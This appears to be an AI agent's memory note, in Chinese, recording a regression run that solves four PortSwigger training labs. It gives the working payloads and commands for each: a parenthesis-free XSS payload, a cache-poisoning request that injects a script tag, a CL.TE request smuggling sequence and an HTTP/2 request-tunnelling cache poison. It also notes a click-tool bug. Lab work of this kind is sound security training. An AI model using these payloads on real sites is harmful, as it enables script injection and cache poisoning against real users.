---
metadata:
  node_type: memory
name: "PRS regression batch R2"
description: "回归批 R2(4 题冷会话重解):4/4 到 congrats,回归过;发现 page_alert --click 不滚动目标导致首屏外元素点击假阴性"
last_updated: 2026-10-08T08:37:32+08:00
created: 2026-10-08T08:37:32+08:00
---

# 回归批 R2(4 题冷会话重解,progress 基线 114/5/4)

日期 2026-10-08。目的:验证从冷会话到 congrats 的产品全链路(发现面/件面/压缩面)。判据 = 每题 congrats 横幅。题解未读;一切 HTTP 走件;未 git 提交。

## 终态(4/4 congrats)

1. `cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked` — **congrats**(banner_verdict solved=true + `<h4>Congratulations…`)。实例 0a6300110339fb4681ecd46f00d40096。载荷同批49(零括弧 `throw/**/onerror=alert,1337` + `toString=x,window+''`),`page_alert --click '.is-linkback a'`。用时 ~2min(含一次假阴性,见下)。
2. `web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query` — **congrats**(未缓存页 `/post?postId=1` 读到 congrats 行)。实例 0a3900170440bb9380e6b2eb00c80076。`raw_poison "<inst>/" --request-line "GET /?cb='/><script>alert(1)</script> HTTP/1.1" --interval-secs 6 --count 24`,≤1min 命中(`GET /` → x-cache hit + canonical 携带 `<script>alert(1)</script>`)。用时 ~2min。
3. `request-smuggling/lab-basic-cl-te` — **congrats**(banner_verdict solved=true)。实例 0a3200f703f1487581441137004a00a2。`conn_reuse <inst>/ --cl-te 'G' --read-ms 2500 --quiet`(首跳 200)→ `conn_reuse <inst>/ --send-str 'POST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde'` → 403 `"Unrecognized method GPOST"`。用时 ~1min。
4. `request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling` — **congrats**(`/post?postId=1`)。实例 0a9e0072048c3a5b8083268c008f0009。`M = GET / 的 content-length = 8541`;`h2_req <inst>/ --method HEAD --path '/ HTTP/1.1\r\nHost: <inst>\r\n\r\nGET /resources/labheader/js?<script>alert(1)</script>' --pad-path-to 9000 --read-ms 6000` → 200 + `x-cache: miss` + CL 8541,body = 嵌套 302 原文;随后 `GET /` → `x-cache: hit` 同 body。一次性收口。用时 ~2min(含等缓存过期 nap 15)。

**结论:回归过** — 4/4 从冷会话到 congrats,发现面/件面/判读面无回归。

## 回归发现(产品面)

- **`page_alert --click` 不滚动目标 ⇒ 首屏外元素的点击假阴性**。lab1 的 `Back to Blog`(`.is-linkback a`)在长页底部:直接 `page_alert <url> --click '.is-linkback a'` 得 `fired=false`(42s 空等);同刻阳性对照(`data:text/html,<a id=t href="javascript:alert%281337%29">go</a>` --click '#t')= `fired=true` ⇒ 件与管线本身正常。加 `--driver "document.querySelector('.is-linkback a').scrollIntoView({block:'center'})"` 后立刻 `fired=true, alerts:["alert:Uncaught 1337"]`。根因:`page_alert` 用 `getBoundingClientRect()`(视口坐标)+ `Input.dispatchMouseEvent`,不先滚动 ⇒ 元素在视口外时点击坐标打空。批49 未加 driver 即成功(视口/滚动态不同)⇒ 属**位置相关的假阴性**,非载荷问题。已建议:件面 `--click` 前自动 `scrollIntoView`;纪律记入 [[focus 触发载荷判读-先让文档处于聚焦态]]。
- **环境**:发射钥匙 `/tmp/cj1.json`(portswigger.net `.AspNetCore.CookiesC1/C2`)仍有效,4 次 `range_launch` 均 `oidc_form_submitted=false` 直达,未动 auth0;实例均新发且 lab_id 与档一致。
- **lab2 判读纪律复证**:毒未落前 `GET /` 的 `x-cache` 可为 HIT,且其缓存体由**无 query 请求**生成 ⇒ canonical 不含 `?cb=`,**不能据此判「query 不反射」**;等过期窗口 MISS 后 canonical 才携带整条 query。

